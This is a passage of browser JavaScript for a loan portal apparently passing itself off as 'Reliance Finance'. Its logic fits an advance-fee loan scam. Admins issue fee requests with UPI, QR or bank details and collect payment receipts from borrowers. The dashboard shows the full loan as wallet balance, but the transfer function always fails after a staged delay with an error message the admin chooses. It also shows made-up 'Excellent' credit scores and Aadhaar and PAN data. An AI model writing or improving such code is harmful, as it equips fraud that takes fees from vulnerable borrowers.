                    paymentRequests: [],
                    paymentsHistory: [],
                    kycAadhaar: document.getElementById('kycAadhaar').checked,
                    kycPan: document.getElementById('kycPan').checked,
                    kycSalary: document.getElementById('kycSalary').checked,
                    showNoc: document.getElementById('admShowNoc').checked,
                    applicationSource: "admin"
                };
                loans.push(newLoan);
                alert('New Loan Added Successfully by Admin!');
            }

            localStorage.setItem('loans', JSON.stringify(loans));
            closeAddModal();
            loadAdminTable();
        }

        function openApprovalModal(id) {
            const loans = JSON.parse(localStorage.getItem('loans') || '[]');
            const found = loans.find(l => l.id === id);
            if (!found) return;
            document.getElementById('approvalLoanId').value = id;
            document.getElementById('approvalRate').value = found.status === 'Approved' ? (found.rate || '') : '';
            document.getElementById('approvalTenure').value = found.tenure || '60';
            document.getElementById('approvalCustomerSummary').innerHTML = `<strong>${found.name || ''}</strong><br><span class="text-gray-500 text-xs">${found.type || ''} • Requested ₹${Number(found.amount || 0).toLocaleString('en-IN')} • Preferred ${found.tenure || '—'} Months</span>`;
            updateApprovalEmiPreview();
            document.getElementById('approvalModal').classList.remove('hidden');
        }

        function closeApprovalModal() {
            document.getElementById('approvalModal').classList.add('hidden');
            document.getElementById('approvalForm').reset();
        }

        function updateApprovalEmiPreview() {
            const id = Number(document.getElementById('approvalLoanId').value);
            const loans = JSON.parse(localStorage.getItem('loans') || '[]');
            const found = loans.find(l => l.id === id);
            const p = parseFloat(found?.amount) || 0;
            const rate = parseFloat(document.getElementById('approvalRate').value) || 0;
            const n = parseInt(document.getElementById('approvalTenure').value) || 0;
            const box = document.getElementById('approvalEmiPreview');
            if (!box || p <= 0 || rate <= 0 || n <= 0) {
                if (box) box.innerText = 'Enter valid interest rate and tenure to see EMI.';
                return;
            }
            const r = rate / 12 / 100;
            const emi = (p * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
            box.innerText = `Approved EMI: ₹${Math.round(emi).toLocaleString('en-IN')} / month`;
        }

        document.addEventListener('input', function(e) {
            if (e.target && (e.target.id === 'approvalRate' || e.target.id === 'approvalTenure')) updateApprovalEmiPreview();
        });

        async function confirmLoanApproval(e) {
            e.preventDefault();
            const id = Number(document.getElementById('approvalLoanId').value);
            const rate = parseFloat(document.getElementById('approvalRate').value);
            const tenure = parseInt(document.getElementById('approvalTenure').value);
            if (!(rate > 0) || !(tenure > 0)) {
                alert('Please enter a valid interest rate and tenure.');
                return;
            }
            let loans = JSON.parse(localStorage.getItem('loans') || '[]');
            loans = loans.map(l => l.id === id ? { ...l, status: 'Approved', rate: String(rate), tenure: String(tenure), approvedAt: new Date().toISOString() } : l);
            localStorage.setItem('loans', JSON.stringify(loans));
            closeApprovalModal();
            loadAdminTable();
            if (document.getElementById('newApplicationsModal') && !document.getElementById('newApplicationsModal').classList.contains('hidden')) renderNewApplications();
            alert('Loan approved. Admin-set interest rate and tenure saved.');
        }

        function updateStatus(id, newStatus) {
            let loans = JSON.parse(localStorage.getItem('loans'));
            loans = loans.map(l => l.id === id ? {...l, status: newStatus} : l);
            localStorage.setItem('loans', JSON.stringify(loans));
            loadAdminTable();
            if (document.getElementById('newApplicationsModal') && !document.getElementById('newApplicationsModal').classList.contains('hidden')) renderNewApplications();
        }

        function deleteLoan(id) {
            if (confirm("Are you sure you want to delete this loan record?")) {
                let loans = JSON.parse(localStorage.getItem('loans'));
                loans = loans.filter(l => l.id !== id);
                localStorage.setItem('loans', JSON.stringify(loans));
                loadAdminTable();
                if (document.getElementById('newApplicationsModal') && !document.getElementById('newApplicationsModal').classList.contains('hidden')) renderNewApplications();
            }
        }

        async function checkLoanStatus() {
            let key = document.getElementById('searchKey').value.trim();
            let resultDiv = document.getElementById('statusResult');
            if (!key) { resultDiv.innerHTML = '<p class="text-red-500 font-semibold mt-4">Please enter your mobile number or Govt ID.</p>'; return; }
            let found = null;
            try {
                const response = await fetch('/api/customer/status?identifier=' + encodeURIComponent(key));
                const payload = await response.json();
                if (!response.ok) throw new Error(payload.message || 'No loan record found for this number.');
                found = payload;
            } catch (error) {
                resultDiv.innerHTML = `<p class="text-red-500 font-semibold mt-4">${error.message || 'Unable to check status. Please try again.'}</p>`;
                return;
            }
            if (found) {
                let badgeColor = found.status === 'Approved' ? 'text-green-600' : (found.status === 'Rejected' ? 'text-red-600' : 'text-yellow-600');
                let rateVal = found.rate || "8.5";
                let tenureVal = found.tenure || "60";
                let cibilVal = found.cibil || "750";
                resultDiv.innerHTML = `
                    <div class="bg-white p-6 rounded-2xl shadow-xl border-l-4 border-blue-950 mt-4">
                        <div class="flex items-center space-x-4 mb-3">
                            <img src="${found.photo}" class="w-12 h-12 rounded-full object-cover border">
                            <div>
                                <h4 class="font-bold text-lg text-blue-950">${found.name}</h4>
                                <p class="text-xs text-gray-500 uppercase">PAN: ${found.pan} | CIBIL Score: <strong class="text-blue-900">${cibilVal} (Excellent)</strong></p>
                            </div>
                        </div>
                        <p class="text-sm text-gray-600">Loan Type: <span class="font-semibold">${found.type}</span></p>
                        <p class="text-sm text-gray-600">Sanction Amount: <span class="font-semibold">₹${Number(found.amount).toLocaleString('en-IN')}</span></p>
                        <p class="text-sm text-gray-600">Interest Rate & Tenure: <span class="font-semibold">${rateVal}% p.a. / ${tenureVal} Months</span></p>
                        <p class="text-sm font-bold mt-2">Status: <span class="${badgeColor}">${found.status}</span></p>
                    </div>
                `;
            } else {
                resultDiv.innerHTML = `<p class="text-red-500 font-semibold mt-4">No loan record found for this number.</p>`;
            }
        }

        async function customerLogin() {
            let identifier = document.getElementById('loginIdentifier').value.trim();
            if (!identifier) {
                alert("Kripya apna Mobile Number ya Govt ID darj karein.");
                return;
            }
            let found;
            try {
                const response = await fetch('/api/customer/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ identifier })
                });
                const payload = await response.json();
                if (!response.ok) throw new Error(payload.message || 'Customer record not found.');
                found = payload.loan;
                sessionStorage.setItem('rf_customer_token', payload.token);
                window.rfApi.setLoans([found], true);
            } catch (error) {
                alert(error.message || 'Customer login failed.');
                return;
            }

            if (found) {
                activeCustomerMobile = found.mobile;
                document.getElementById('loginBox').classList.add('hidden');
                document.getElementById('profileDashboard').classList.remove('hidden');

                document.getElementById('profName').innerText = found.name;
                document.getElementById('profMob').innerText = found.mobile;
                document.getElementById('profAad').innerText = found.aadhaar;
                document.getElementById('profPan').innerText = found.pan;
                document.getElementById('profType').innerText = found.type;
                document.getElementById('profCibil').innerText = found.cibil || "780";
                document.getElementById('profRate').innerText = found.rate ? `${found.rate}% p.a.` : 'Pending Admin Approval';
                document.getElementById('profTenure').innerText = found.tenure ? `${found.tenure} Months` : 'Pending Admin Approval';
                document.getElementById('profImg').src = found.photo;

                let walletAmt = (found.status === 'Approved') ? Number(found.amount).toLocaleString('en-IN') : '0';
                document.getElementById('walletBalance').innerText = `₹${walletAmt}`;

                let feeSec = document.getElementById('feePaymentSection');
                let requests = Array.isArray(found.paymentRequests) ? found.paymentRequests : [];
                let activeRequest = requests.find(r => r.status === 'Pending' || r.status === 'Submitted');

                if (activeRequest) {
                    feeSec.classList.remove('hidden');
                    document.getElementById('custFeeHeading').innerText = activeRequest.heading || 'Payment Request';
                    document.getElementById('custFeeMessage').innerText = activeRequest.message || 'Reliance Finance has issued a payment request against your customer profile.';
                    document.getElementById('custDisplayFeeAmount').innerText = Number(activeRequest.amount || 0).toLocaleString('en-IN');
                    document.getElementById('custDisplayNote').innerText = activeRequest.purpose || '';
                    document.getElementById('custFeeStatusBadge').innerText = activeRequest.status === 'Submitted' ? 'Payment Submitted - Verification Pending' : 'Payment Required';
                    document.getElementById('custFeeUtr').value = activeRequest.utr || '';
                    document.getElementById('custFeeUtr').dataset.requestId = activeRequest.id;

                    let receiptInput = document.getElementById('custFeeReceipt');
                    if (receiptInput) receiptInput.value = '';
                    let proofForm = document.querySelector('#feePaymentSection form');
                    if (proofForm) proofForm.classList.toggle('hidden', activeRequest.status === 'Submitted');

                    let containerQr = document.getElementById('custContainerQr');
                    let containerBank = document.getElementById('custContainerBank');
                    if (activeRequest.type === 'QR') {
                        containerQr.classList.remove('hidden');
                        containerBank.classList.add('hidden');
                        document.getElementById('custDisplayQr').src = activeRequest.qrUrl || '';
                        document.getElementById('custDisplayUpi').innerText = activeRequest.upiId || '—';
                    } else {
                        containerBank.classList.remove('hidden');
                        containerQr.classList.add('hidden');
                        document.getElementById('custDisplayAccNo').innerText = activeRequest.accNo || '—';
                        document.getElementById('custDisplayIfsc').innerText = activeRequest.ifsc || '—';
                    }
                } else {
                    feeSec.classList.add('hidden');
                }

                let paymentHistoryBody = document.getElementById('customerPaymentHistoryTable');
                paymentHistoryBody.innerHTML = '';
                let historyList = found.paymentsHistory || [];

                if (historyList.length > 0) {
                    historyList.forEach(item => {
                        let statusBadge = item.status === 'Verified' ? 
                            '<span class="bg-green-100 text-green-800 px-2 py-0.5 rounded font-bold">Verified ✓</span>' : 
                            '<span class="bg-amber-100 text-amber-800 px-2 py-0.5 rounded font-bold">Pending Verification</span>';
                        let receiptBtn = item.receiptImage ? `<button onclick="viewCustomerPaymentReceipt('${item.id || item.requestId || ''}')" class="ml-2 text-blue-700 font-bold underline">View Receipt</button>` : '';

                        paymentHistoryBody.innerHTML += `
                            <tr>
                                <td class="p-3 font-medium">${item.purpose}</td>
                                <td class="p-3 font-bold text-blue-950">₹${Number(item.amount).toLocaleString('en-IN')}</td>
                                <td class="p-3 font-mono text-gray-700">${item.utr} ${receiptBtn}</td>
                                <td class="p-3 text-gray-500">${item.date}</td>
                                <td class="p-3">${statusBadge}</td>
                            </tr>
                        `;
                    });
                } else {
                    paymentHistoryBody.innerHTML = `<tr><td colspan="5" class="p-4 text-center text-gray-500">Abhi tak koi transaction record nahi hai.</td></tr>`;
                }

                let nocBtn = document.getElementById('custNocBtn');
                if (found.showNoc) {
                    nocBtn.classList.remove('hidden');
                } else {
                    nocBtn.classList.add('hidden');
                }

                document.getElementById('letterName').innerText = found.name;
                document.getElementById('letterDearName').innerText = found.name;
                document.getElementById('letterMob').innerText = found.mobile;
                document.getElementById('letterAad').innerText = found.aadhaar;
                document.getElementById('letterPan').innerText = found.pan;
                document.getElementById('letterType').innerText = found.type;
                document.getElementById('letterCibil').innerText = found.cibil || "780";
                document.getElementById('letterAmount').innerText = `₹${Number(found.amount).toLocaleString('en-IN')}`;
                document.getElementById('letterImg').src = found.photo;

                let rVal = parseFloat(found.rate) || 8.5;
                let tVal = parseInt(found.tenure) || 60;
                document.getElementById('letterRate').innerText = `${rVal}% per annum`;
                document.getElementById('letterTenure').innerText = `${tVal} Months`;
                
                let p = parseFloat(found.amount) || 0;
                let rMonthly = (rVal / 12 / 100);
                let emi = (p * rMonthly * Math.pow(1 + rMonthly, tVal)) / (Math.pow(1 + rMonthly, tVal) - 1);
                document.getElementById('letterEMI').innerText = `₹${Math.round(emi).toLocaleString('en-IN')} /month`;

                let amortBody = document.getElementById('amortizationTableBody');
                amortBody.innerHTML = '';
                let balance = p;
                for (let i = 1; i <= Math.min(tVal, 12); i++) {
                    let interestPayment = balance * rMonthly;
                    let principalPayment = emi - interestPayment;
                    let endingBalance = balance - principalPayment;

                    amortBody.innerHTML += `
                        <tr>
                            <td class="p-2.5 font-semibold">Month ${i}</td>
                            <td class="p-2.5">₹${Math.round(balance).toLocaleString('en-IN')}</td>
                            <td class="p-2.5">₹${Math.round(emi).toLocaleString('en-IN')}</td>
                            <td class="p-2.5 text-green-700 font-semibold">₹${Math.round(principalPayment).toLocaleString('en-IN')}</td>
                            <td class="p-2.5 text-red-600 font-semibold">₹${Math.round(interestPayment).toLocaleString('en-IN')}</td>
                            <td class="p-2.5">₹${Math.round(Math.max(0, endingBalance)).toLocaleString('en-IN')}</td>
                        </tr>
                    `;
                    balance = endingBalance;
                }

                let badge = document.getElementById('letterStatusBadge');
                badge.innerText = found.status.toUpperCase();
                badge.className = found.status === 'Approved' ? 'bg-green-100 text-green-800 px-4 py-1.5 rounded text-xs font-black uppercase shadow-sm inline-block mb-2' : (found.status === 'Rejected' ? 'bg-red-100 text-red-800 px-4 py-1.5 rounded text-xs font-black uppercase shadow-sm inline-block mb-2' : 'bg-yellow-100 text-yellow-800 px-4 py-1.5 rounded text-xs font-black uppercase shadow-sm inline-block mb-2');
            } else {
                alert('Yeh mobile number ya Govt ID records mein nahi mila.');
            }
        }

        function submitFeeProof(e) {
            e.preventDefault();
            let utr = document.getElementById('custFeeUtr').value.trim();
            let requestId = document.getElementById('custFeeUtr').dataset.requestId || '';
            let receiptFile = document.getElementById('custFeeReceipt').files[0];

            if (!utr || !requestId) {
                alert('Payment request ya UTR missing hai.');
                return;
            }
            if (!receiptFile) {
                alert('Payment receipt photo upload karna zaroori hai.');
                return;
            }

            let reader = new FileReader();
            reader.onload = function(ev) {
                let loans = JSON.parse(localStorage.getItem('loans') || '[]');
                let currentDate = new Date().toLocaleDateString('en-IN', { day: 'numeric', month: 'short', year: 'numeric' });

                loans = loans.map(l => {
                    if (l.mobile !== activeCustomerMobile) return l;
                    let requests = Array.isArray(l.paymentRequests) ? l.paymentRequests : [];
                    let req = requests.find(r => r.id === requestId && r.status === 'Pending');
                    if (!req) return l;

                    let paymentId = 'TXN-' + Date.now() + '-' + Math.random().toString(36).slice(2, 7).toUpperCase();
                    let updatedReq = {
                        ...req,
                        status: 'Submitted',
                        utr: utr,
                        receiptImage: ev.target.result,
                        paymentId: paymentId,
                        submittedAt: new Date().toISOString()
                    };
                    requests = requests.map(r => r.id === requestId ? updatedReq : r);

                    let history = Array.isArray(l.paymentsHistory) ? l.paymentsHistory : [];
                    history.push({
                        id: paymentId,
                        requestId: requestId,
                        purpose: req.purpose || req.heading || 'Payment',
                        amount: req.amount,
                        utr: utr,
                        date: currentDate,
                        status: 'Pending Verification',
                        receiptImage: ev.target.result
                    });

                    let nextPending = requests.find(r => r.status === 'Pending');
                    return {
                        ...l,
                        paymentRequests: requests,
                        paymentsHistory: history,
                        feeStatus: nextPending ? 'Pending' : 'Submitted',
                        feeAmount: nextPending ? nextPending.amount : req.amount,
                        feeNote: nextPending ? nextPending.purpose : req.purpose,
                        feeHeading: nextPending ? nextPending.heading : req.heading,
                        feeMessage: nextPending ? nextPending.message : req.message
                    };
                });

                localStorage.setItem('loans', JSON.stringify(loans));
                alert("Payment UTR aur receipt photo successfully submit ho gaya. Admin manual verification ke baad status Verified hoga.");
                document.getElementById('custFeeUtr').value = '';
                document.getElementById('custFeeReceipt').value = '';
                customerLogin();
            };
            reader.readAsDataURL(receiptFile);
        }

        function openCustomerTransactionHistory() {
            let el = document.getElementById('customerTransactionHistorySection');
            if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }

        function viewCustomerPaymentReceipt(paymentId) {
            let loans = JSON.parse(localStorage.getItem('loans') || '[]');
            let found = loans.find(l => l.mobile === activeCustomerMobile);
            let item = (found?.paymentsHistory || []).find(h => h.id === paymentId || h.requestId === paymentId);
            if (!item || !item.receiptImage) {
                alert('Receipt image available nahi hai.');
                return;
            }
            let w = window.open('', '_blank');
            if (w) w.document.write(`<title>Payment Receipt</title><img src="${item.receiptImage}" style="max-width:100%;height:auto;display:block;margin:20px auto;">`);
        }

        function logoutCustomer() {
            sessionStorage.removeItem('rf_customer_token');
            activeCustomerMobile = "";
            document.getElementById('profileDashboard').classList.add('hidden');
            document.getElementById('loginBox').classList.remove('hidden');
            document.getElementById('loginIdentifier').value = '';
        }

        function openTransferModal() {
            let loans = JSON.parse(localStorage.getItem('loans'));
            let found = loans.find(l => l.mobile === activeCustomerMobile);

            if (!found || found.status !== 'Approved') {
                alert("Transfer failed: Your loan is not approved yet or wallet balance is zero.");
                return;
            }

            document.getElementById('trfName').value = found.name;
            document.getElementById('trfAmount').value = found.amount;
            document.getElementById('transferMsgContainer').classList.add('hidden');
            document.getElementById('transferModal').classList.remove('hidden');
        }

        function closeTransferModal() {
            document.getElementById('transferModal').classList.add('new') || document.getElementById('transferModal').classList.add('hidden');
            document.getElementById('transferForm').reset();
            document.getElementById('transferMsgContainer').classList.add('hidden');
        }

        function processBankTransfer(e) {
            e.preventDefault();
            let submitBtn = document.getElementById('trfSubmitBtn');
            let msgContainer = document.getElementById('transferMsgContainer');
            
            let loans = JSON.parse(localStorage.getItem('loans'));
            let found = loans.find(l => l.mobile === activeCustomerMobile);

            let currentErrorMessage = (found && found.customError && found.customError.trim() !== "") 
                ? found.customError 
                : defaultTransferError;

            submitBtn.disabled = true;
            submitBtn.innerText = "Processing Transfer...";

            setTimeout(() => {
                submitBtn.disabled = false;
                submitBtn.innerText = "Initiate Transfer";

                msgContainer.classList.remove('hidden');
                msgContainer.innerHTML = `
                    <div class="bg-red-50 border-2 border-red-500 text-red-700 p-4 rounded-xl text-center shadow-inner space-y-1">
                        <div class="font-black text-base flex items-center justify-center space-x-0.5">
                            <i class="fa-solid fa-triangle-exclamation"></i>
                            <span>TRANSFER FAILED!</span>
                        </div>
                        <p id="transferFailureText" class="text-xs font-medium"></p>
                    </div>
                `;
                document.getElementById('transferFailureText').textContent = currentErrorMessage;
            }, 1500);
        }

        function openNocModal() {
            let loans = JSON.parse(localStorage.getItem('loans'));
            let found = loans.find(l => l.mobile === activeCustomerMobile);
            if (!found) return;

            document.getElementById('nocName').innerText = found.name;
            document.getElementById('nocMob').innerText = found.mobile;
            document.getElementById('nocPan').innerText = found.pan;
            document.getElementById('nocAadhaar').innerText = found.aadhaar;
            document.getElementById('nocLoanType').innerText = found.type;
            document.getElementById('nocAmount').innerText = `₹${Number(found.amount).toLocaleString('en-IN')}`;

            document.getElementById('nocModal').classList.remove('hidden');
        }

        function closeNocModal() {
            document.getElementById('nocModal').classList.add('hidden');
        }